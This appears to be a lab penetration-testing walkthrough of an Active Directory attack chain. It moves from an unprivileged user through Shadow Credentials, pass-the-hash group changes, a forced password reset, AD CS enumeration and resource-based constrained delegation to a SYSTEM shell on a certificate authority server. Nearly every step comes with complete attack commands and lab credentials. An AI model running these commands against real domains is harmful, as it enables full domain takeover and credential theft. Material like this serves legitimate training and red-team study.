## Attack Chain: DACL Abuse (AddCredentialLink -> AddGroupMember -> ForceChangePassword) -> AD CS Escalation

**Primary Goal:** Escalate privileges from an initially compromised, unprivileged domain user (`marcus`) to full SYSTEM access on the domain's Certificate Authority server (`SVRCA01`). This establishes a critical foothold for complete domain compromise and persistent access.

**TL;DR:** This document details a complex Active Directory privilege escalation path starting from a compromised standard user and resulting in a full SYSTEM compromise of a Certificate Authority server. It chains together nested Discretionary Access Control List (DACL) misconfigurations involving Shadow Credentials, Group Modifications, and Password Resets to gain control of a privileged user. It then ultimately abuses Resource-Based Constrained Delegation (RBCD) to take over the CA server.

### High-Level Attack Flow

1. **Marcus** abuses `AddCredentialLink` to compromise the **MGMT1$** machine account via Shadow Credentials.
2. **MGMT1$** abuses `AddGroupMember` to add Marcus to the **General Management** group.
3. The **General Management** group abuses `ForceChangePassword` to reset **Jamie's** password.
4. **Jamie** abuses `AddGroupMember` to add himself to the **CA Managers** group.
5. The **CA Managers** group abuses DACL write privileges over the CA server object to perform an **RBCD** attack, granting SYSTEM access to the **SVRCA01** Certificate Authority.

### Step 1: Abuse Shadow Credentials (`pyWhisker`)

We will utilize `pyWhisker` for this step. It automates the generation of a cryptographic certificate and the modification of the `msDS-KeyCredentialLink` LDAP attribute on the target machine. Run this using Marcus's credentials:

```
pywhisker -d "zsm.local" -u "marcus" -p '!QAZ2wsx' -t "ZPH-SVRMGMT1$" -a "add" -f "mgmt1.pfx" --dc-ip 192.168.210.10
```

*Output snippet:*

```
[*] Must be used with password: VEFN0qPzn7zuwbbpUDqP
[*] A TGT can now be obtained with [https://github.com/dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)
```

When this finishes, it will print a randomly generated password to your screen for the `.pfx` file. **Save that password**, and you will now have a file named `mgmt1.pfx` in your directory.

### Step 2: Request the TGT (`PKINITtools`)

Now that the Domain Controller trusts your certificate for that computer account via PKINIT, you use `gettgtpkinit.py` (from the PKINITtools suite) to request a Ticket Granting Ticket (TGT).

```
python3 gettgtpkinit.py -cert-pfx mgmt1.pfx -pfx-pass 'VEFN0qPzn7zuwbbpUDqP' 'zsm.local/ZPH-SVRMGMT1$' mgmt1.ccache
```

This will download `mgmt1.ccache` and print an `AS-REP encryption key` to your terminal. Copy that encryption key for the next step.

### Step 3: Extract the Machine Account NT Hash

While you could use the `.ccache` ticket directly for Kerberos authentication, it is usually much easier to extract the raw NT hash of the `ZPH-SVRMGMT1$` machine account so you can perform a Pass-the-Hash (PtH) attack with standard impacket tools.

```
python3 getnthash.py -key '521d4ee29d3120c93207c2a383969f66229d857187e1e62f73cb8561ff38dd09' 'zsm.local/ZPH-SVRMGMT1$'
```

*Output snippet:*

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
89d0b56874f61ad38bad336a77b8ef2f
```

### Step 4: Add Marcus to General Management

You will authenticate to the Domain Controller as the `ZPH-SVRMGMT1$` computer account and abuse its privileges to add the `marcus` principal into the `General Management` group.

```
net rpc group addmem "General Management" "marcus" -U 'zsm.local'/'ZPH-SVRMGMT1$'%'89d0b56874f61ad38bad336a77b8ef2f' -S 192.168.210.10
```

### Step 5: Reset Jamie's Password

Now that Marcus is in the `General Management` group, you have inherited `ForceChangePassword` rights over Jamie.

```
net rpc password 'jamie' 'Winter2026!' -U 'zsm.local'/'ZPH-SVRMGMT1$'%'89d0b56874f61ad38bad336a77b8ef2f' -S 192.168.210.10
```

### Step 6: Compromise the `CA Managers` Group and Enumerate AD CS

Jamie has the `AddGroupMember` privilege over the `CA Managers` group. Adding ourselves to this group will allow us to enumerate the Certificate Authority (CA) with `certipy` to identify Active Directory Certificate Services (AD CS) misconfigurations to facilitate domain privilege escalation. This also gives us access to the `SVRCA01` server.

#### 1. Check CA-Level Permissions (ESC7)

AD CS has its own internal ACLs separate from standard Active Directory. We need to see if the `CA Managers` group has rights to manage the CA server itself (specifically the `ManageCA` or `ManageCertificates` rights).

Since Jamie is a local admin on `MGMT1`, log in there and run this native Windows command to dump the CA's access control list:

```
certutil -config "ZPH-SVRCA01.zsm.local\zsm-ZPH-SVRCA01-CA" -ca.acl
```

#### 2. Check Template-Level Permissions (ESC4)

If Jamie does not have rights over the CA server itself, he might have rights over the *Certificate Templates* stored in Active Directory. If `CA Managers` has `Write` access to a template, Jamie can modify it to make it vulnerable to domain escalation (for instance, allowing Client Authentication and supplying a Subject Alternative Name).

```
certipy find -u 'jamie@zsm.local' -p 'Winter2026!' -dc-ip 192.168.210.10 -vulnerable
```

#### 3. Native AD Query (Living off the Land)

If you want to use Living off the Land (LotL) techniques and query the template permissions directly from your `MGMT1` shell, drop into PowerShell and run this to view the ACLs on the Certificate Templates container:

```
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$context = $domain.GetDirectoryEntry().ConfigurationNamingContext
$path = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$context"
$acl = (Get-Acl $path).Access
$acl | Where-Object { $_.IdentityReference -match "CA Managers" } | Format-List
```

Take action if vulnerabilities are found. If Certipy reports no vulnerable templates and no standard ESC7 rights are present, it indicates the lab creators patched standard AD CS template attacks, and we must pivot to an alternative path.

## Alternate Path: Resource-Based Constrained Delegation (RBCD) via CA Managers

### Step 1: Verify Jamie's Write Access

Use `dacledit.py` to check if Jamie (or the `CA Managers` group he is a member of) has write permissions over the CA server object in AD.

```
dacledit.py -action read -target ZPH-SVRCA01$ -principal jamie 'zsm.local/jamie':'Winter2026!' -dc-ip 192.168.210.10
```

If this outputs that Jamie has `GenericWrite`, `GenericAll`, or `WriteDacl`, you can proceed. If not, RBCD exploitation is unlikely to succeed.

### Step 2: Create a Rogue Computer Account (MAQ Abuse)

To execute RBCD, Jamie needs to create a new computer account in Active Directory to act as the delegating principal. We can abuse the default `MachineAccountQuota` (MAQ), which allows standard users to create up to 10 computer accounts.

```
addcomputer.py 'zsm.local/jamie':'Winter2026!' -computer-name 'EVILPC$' -computer-pass 'Winter2026!' -dc-ip 192.168.210.10
```

### Step 3: Configure Constrained Delegation (RBCD)

Next, Jamie writes to the CA Server's Active Directory object, modifying its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. This explicitly permits delegation from the `EVILPC$` rogue account.

```
rbcd.py 'zsm.local/jamie':'Winter2026!' -delegate-to 'ZPH-SVRCA01$' -delegate-from 'EVILPC$' -action write -dc-ip 192.168.210.10
```

### Step 4: Perform S4U Ticket Forgery

Now that the CA server explicitly permits delegation from `EVILPC$`, you will execute an S4U2Self/S4U2Proxy request to the Domain Controller. This allows you to forge a Kerberos Service Ticket (ST) to the CA Server while impersonating the Enterprise Administrator.

```
getST.py 'zsm.local/EVILPC$':'Winter2026!' -spn cifs/ZPH-SVRCA01.zsm.local -impersonate Administrator -dc-ip 192.168.210.10
```

### Step 5: Execute Code as SYSTEM on the CA Server

This will drop an `Administrator.ccache` ticket into your working directory. Export it to your environment variables, and obtain a SYSTEM-level shell on the CA server using `psexec.py`.

```
export KRB5CCNAME=$(pwd)/Administrator.ccache
psexec.py 'zsm.local/Administrator'@ZPH-SVRCA01.zsm.local -k -no-pass
```